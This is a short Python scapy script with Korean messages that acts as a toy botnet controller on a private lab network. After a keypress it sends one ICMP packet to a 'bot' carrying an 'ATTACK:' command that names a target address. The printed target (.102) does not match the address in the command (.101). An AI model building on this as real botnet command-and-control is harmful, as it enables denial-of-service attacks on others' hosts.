from scapy.all import *

print('봇넷 1:192.168.219.103')
print('봇넷 2:192.168.219.101')
print('봇넷 3:None')
print('\n')
print('타겟: 192.168.219.102')
print('\n')
print('공격 프로토콜: ICMP')
print('\n')
print('\n')

a = input('아무키나 누르면 공격 명령:')

send(IP(dst="192.168.219.103") / ICMP() / 'ATTACK:192.168.219.101', verbose=False)

print('삐용삐용 경찰차가 가는중입니다.')